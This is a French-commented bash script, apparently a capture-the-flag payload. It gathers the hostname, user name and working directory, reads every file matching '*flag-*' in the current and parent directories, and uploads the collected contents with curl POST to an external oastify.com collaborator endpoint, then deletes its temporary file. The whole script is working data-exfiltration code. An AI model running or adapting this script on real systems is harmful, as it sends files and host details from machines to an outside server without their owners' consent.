#!/bin/bash

# Configuration - Remplacer par votre serveur distant
ENDPOINT="http://zsvdk6g9sbzjggbsjtztrdpv2m8dwfk4.oastify.com/upload"

# Créer un fichier temporaire
TEMP_FILE=$(mktemp)

echo "Recherche des fichiers flag dans ./ et ../..."

# Ajout d'en-tête pour identification
echo "=== FLAG FINDER RESULTS ===" > "$TEMP_FILE"
echo "Date: $(date)" >> "$TEMP_FILE"
echo "Host: $(hostname)" >> "$TEMP_FILE"
echo "User: $(whoami)" >> "$TEMP_FILE"
echo "Working directory: $(pwd)" >> "$TEMP_FILE"
echo "=========================" >> "$TEMP_FILE"
echo "" >> "$TEMP_FILE"

# Recherche dans le répertoire courant
echo "=== Répertoire courant (./) ===" >> "$TEMP_FILE"
for file in $(find ./ -type f -name "*flag-*" 2>/dev/null); do
    echo "Fichier: $file" >> "$TEMP_FILE"
    echo "Contenu:" >> "$TEMP_FILE"
    cat "$file" 2>/dev/null >> "$TEMP_FILE"
    echo "-------------------------" >> "$TEMP_FILE"
done

# Recherche dans le répertoire parent
echo "" >> "$TEMP_FILE"
echo "=== Répertoire parent (../) ===" >> "$TEMP_FILE"
for file in $(find ../ -type f -name "*flag-*" 2>/dev/null); do
    echo "Fichier: $file" >> "$TEMP_FILE"
    echo "Contenu:" >> "$TEMP_FILE"
    cat "$file" 2>/dev/null >> "$TEMP_FILE"
    echo "-------------------------" >> "$TEMP_FILE"
done

# Envoi direct avec curl
echo "Envoi des données via curl..."
curl -s -X POST -d "@$TEMP_FILE" "$ENDPOINT"

# Alternative: envoi en tant que fichier joint
# curl -s -F "data=@$TEMP_FILE" "$ENDPOINT"

# Nettoyer
rm -f "$TEMP_FILE"
echo "Opération terminée."
